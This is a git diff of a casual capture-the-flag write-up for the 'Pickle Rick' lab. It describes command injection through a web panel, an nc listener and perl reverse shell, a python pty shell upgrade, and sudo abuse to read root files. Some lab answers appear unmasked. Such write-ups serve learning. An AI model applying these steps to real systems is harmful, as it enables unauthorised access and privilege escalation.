@@ -1,6 +1,6 @@
 # Pickle Rick
 
-# 1. Recon
+## 1. Recon
 
 lets look at the website first. Okay. Nothing special. Looking at the source we have something in the comments:
 ```
@@ -74,7 +74,7 @@ Nothing. a simple redirect. Okay so lets only look at `login.php`. Maybe there i
 
 But what if ... we have both the username and the password already with us? :D
 
-# 2. Foothold
+## 2. Foothold
 So we have a command pannel and we can execute stuff. hmmm.
 
 And, we are at the `portal.php` page. gg.
@@ -100,9 +100,9 @@ It also looks like the `cat` command is disabled. So, lets try alternatives ...
 
 okay ...
 
-`less Sup3rS3cretPickl3Ingred.txt`: `mr. meeseek hair`
+`less Sup3rS3cretPickl3Ingred.txt`: `*** ******* ****`
 
-ew, but yay!
+eww, but yay!
 
 
 Okay. so now i'm trying to `cd ..` but it doesn't wanna work. we did have the ssh port open, so ...
@@ -125,11 +125,10 @@ Let's try settup up `nc` and get a bash reverse shell going on. Get your own ip 
 listening on [any] 4242 ...
 ```
 
-
 hmm. bash gives nothing. 
 let's try perl. 
 
-# I'm IN!
+## 3. Priviledge Escalation
 
 So perl reverse shell works! Now, let's upgrade our shell by `$ python3 -c 'import pty; pty.spawn("/bin/bash")'`
 
@@ -138,16 +137,6 @@ So perl reverse shell works! Now, let's upgrade our shell by `$ python3 -c 'impo
 www-dataÄip-10-10-106-44:/home/rick$ whoami
 whoami
 www-data
-```
-
-exploring, we have:
-```
-www-dataÄip-10-10-106-44:/home/rick$ ls -la      
-ls -la
-total 12
-drwxrwxrwx 2 root root 4096 Feb 10  2019 .
-drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
--rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
 ```
 
 ```
@@ -166,4 +155,52 @@ drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .ssh
 -rw------- 1 ubuntu ubuntu 4267 Feb 10  2019 .viminfo
 ```
 
-some tryhackme bt. ill brb 
+We could try ssh into the system for a proper shell, but I want to check if we have some low hanging fruits here. That is, do we have root permissions?
+
+exploring, we have:
+```
+www-dataÄip-10-10-106-44:/home/rick$ ls -la      
+ls -la
+total 12
+drwxrwxrwx 2 root root 4096 Feb 10  2019 .
+drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
+-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
+```
+
+```
+www-data@ip-10-10-86-16:/home/rick$ cat 'second ingredients'
+cat 'second ingredients'
+* ***** ****
+```
+
+:stonks:
+1 jerry tear
+wait what
+
+```
+www-data@ip-10-10-86-16:/home/rick$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on
+    ip-10-10-86-16.eu-west-1.compute.internal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on
+        ip-10-10-86-16.eu-west-1.compute.internal:
+    (ALL) NOPASSWD: ALL
+```
+
+so we have all the permissions without password lmao
+
+so much for 'priv esc' XD
+
+```
+www-data@ip-10-10-86-16:/$ sudo ls /root/
+sudo ls /root/
+3rd.txt  snap
+www-data@ip-10-10-86-16:/$ sudo cat /root/3rd.txt
+sudo cat /root/3rd.txt
+3rd ingredients: ***** *****
+```
+
+PWNED!
